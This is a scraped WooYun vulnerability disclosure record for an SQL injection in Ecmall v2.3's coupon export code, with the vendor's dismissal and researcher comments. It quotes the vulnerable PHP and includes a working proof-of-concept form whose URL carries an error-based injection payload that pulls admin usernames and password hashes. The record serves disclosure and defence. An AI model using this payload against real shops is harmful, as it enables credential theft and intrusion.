{"id": 5254, "wybug_id": "wooyun-2013-047485", "wybug_title": "Ecmall v2.3 存在SQL注入漏洞", "wybug_corp": "ShopEx", "wybug_author": "kelon", "wybug_date": "2013-12-31 10:46", "wybug_open_date": "2014-03-28 10:47", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向公众公开  简要描述： 快新年了，有礼物木 详细说明：  文件存在app/coupon.app.php\nfunction export()    {        $coupon_id = isset($_GET['id']) ? trim($_GET['id']) : '';  //这里居然不过滤        if (empty($coupon_id))        {            echo Lang::get('no_coupon');            exit;        }        if (!IS_POST)        {            header(\"Content-Type:text/html;charset=\" . CHARSET);            $this->assign('id', $coupon_id);            $this->display('coupon_export.html');        }        else        {            $amount = intval(trim($_POST['amount']));            if (empty($amount))            {                $this->pop_warning('involid_data');                exit;            }            $info = $this->_coupon_mod->get_info($coupon_id);            $coupon_name = ecm_iconv(CHARSET, 'gbk', $info['coupon_name']);            header('Content-type: application/txt');            header('Content-Disposition: attachment; filename=\"coupon_' .date('Ymd'). '_' .$coupon_name.'.txt\"');            $sn_array = $this->generate($amount, $coupon_id);            $crlf = get_crlf();            foreach ($sn_array as $val)            {                echo $val['coupon_sn'] . $crlf;            }        }    } function extend()    {        $coupon_id = isset($_GET['id']) ? trim($_GET['id']) : ''; //这也不过虑    }\n看了一下，发现同时调用了这个方法\nfunction generate($num, $id)    {        $use_times = $this->_coupon_mod->get(array('fields' => 'use_times', 'conditions' => 'store_id = ' . $this->_store_id . ' AND coupon_id = ' . $id)); //这里没有单引号，注入产生了        if ($num > 1000)        {            $num = 1000;        }        if ($num < 1)        {            $num = 1;        }        $times = $use_times['use_times'];        $add_data = array();        $str = '';        $pix = 0;        if (file_exists(ROOT_PATH . '/data/generate.txt'))        {            $s = file_get_contents(ROOT_PATH . '/data/generate.txt');            $pix = intval($s);        }        $max = $pix + $num;        file_put_contents(ROOT_PATH . '/data/generate.txt', $max);        $couponsn = '';        $tmp = '';        $cpm = '';        $str = '';        for ($i = $pix + 1; $i <= $max; $i++ )        {            $cpm = sprintf(\"%08d\", $i);            $tmp = mt_rand(1000, 9999);            $couponsn = $cpm . $tmp;            $str .= \"('{$couponsn}', {$id}, {$times}),\";            $add_data[] = array(                'coupon_sn' => $couponsn,                'coupon_id' => $id,                'remain_times' => $times,                );        }        $string = substr($str,0, strrpos($str, ','));        $this->_couponsn_mod->db->query(\"INSERT INTO {$this->_couponsn_mod->table} (coupon_sn, coupon_id, remain_times) VALUES {$string}\", 'SILENT');        return $add_data;    }\n   漏洞证明：  1、首先注册一个商铺并登录，增加一个优惠券\n\n2.由于是POST注入，为了简单点，就用网页来提交了。\n<form action=\"http://192.168.1.74:8000/ecmall/index.php?app=coupon&act=export&id=1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)%23\" method=\"post\">  <table width=\"960\" border=\"1\">    <tr>      <td width=\"302\">&nbsp;</td>      <td width=\"642\">&nbsp;</td>    </tr>    <tr>      <td><h3>导出数量:</h3></td>      <td><label>        <input name=\"amount\" type=\"text\" id=\"amount\" value=\"1\" />      </label></td>    </tr>    <tr>      <td><label>        <div align=\"right\">          <input type=\"submit\" name=\"Submit\" value=\"提交\" />          </div>      </label></td>      <td>&nbsp;</td>    </tr>  </table></form>\n保存成网页后，在登录IE界面打开这网页并提交，提示下载\n\n保存后，查看你会发现\n\n   修复方案：  过滤 intval   版权声明：转载请注明来源 kelon@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-03-28 10:47 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-31 13:17 |    \t\t木惘然 \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:34        | 欠下的约定)\t\t \n  通用型的会有money哦    \n     2013-12-31 13:56 |    \t\tkelon \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        )\t\t \n  这个有木，有就再来一发。哈    \n     2013-12-31 14:40 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  @kelon 这个厂商我直接联系了都不修复，无语了啊，被迫发一个来乌云，希望没和你的撞洞    \n     2013-12-31 19:47 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  ecmall已经停止更新了    \n     2014-01-05 14:30 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @pandas 还是你厉害啊，厂商忽略了这个，但是确认了你后面提交的那个？为何啊，难道你和@shopex有一腿么    \n     2014-01-05 14:31 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @ShopEx  怎么at不了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}